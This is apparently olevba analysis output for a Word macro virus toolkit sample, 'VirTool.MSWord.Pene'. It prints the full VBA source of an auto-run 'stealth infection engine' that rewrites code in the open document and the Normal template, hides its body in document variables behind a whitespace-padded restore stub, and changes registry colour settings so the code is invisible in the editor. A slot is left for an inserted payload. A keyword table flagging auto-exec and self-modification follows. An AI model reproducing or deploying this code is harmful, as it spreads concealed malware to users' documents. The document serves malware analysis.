olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.Pene-0fb4c3fef95de857561a5fdd0a6035fb9c4f5742
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.Pene-0fb4c3fef95de857561a5fdd0a6035fb9c4f5742 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

Rem + - - - - - - - - - - - - - - - - - - - - - +
Rem | Stealth This Document Infection Engine    |
Rem | fast and 98 % stealth AND class infection |
Rem |                                           |
Rem | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |
Rem + - - - - - - - - - - - - - - - - - - - - - +

On Error Resume Next    'catch all errors
ResetMe = String(5, Chr(13))    'generate stealth
ResetMe = ResetMe & String(300, "   ") & "Private Sub Document_Close(): "   'recover code
ResetMe = ResetMe & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: "   'recover code
ResetMe = ResetMe & "End Sub"   'recover code

For x = 1 To ActiveDocument.Variables.Count   'clear variables
    ActiveDocument.Variables(x).Delete
Next x

For x = 1 To Normal.ThisDocument.Variables.Count   'clear variables
    Normal.ThisDocument.Variables(x).Delete
Next x

With ThisDocument.VBProject.VBComponents(1).CodeModule  'read virus code
    VCC = .Lines(1, .CountOfLines)
End With

With ActiveDocument.VBProject.VBComponents(1).CodeModule    'delete code in Doc
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe 'insert stealth
End With

With Normal.ThisDocument.VBProject.VBComponents(1).CodeModule   'delete code in Normal
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe 'insert stealth
End With

ActiveDocument.Variables.Add (Chr(65)), VCC 'store code in variable area of Doc
Normal.ThisDocument.Variables.Add (Chr(65)), VCC    'store code in variale area of Normal

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"    'change background colors
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"  'change code colors

Penetrate:
'UC (Insert user code here):
Rem
Rem
'SP (path and program to start)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

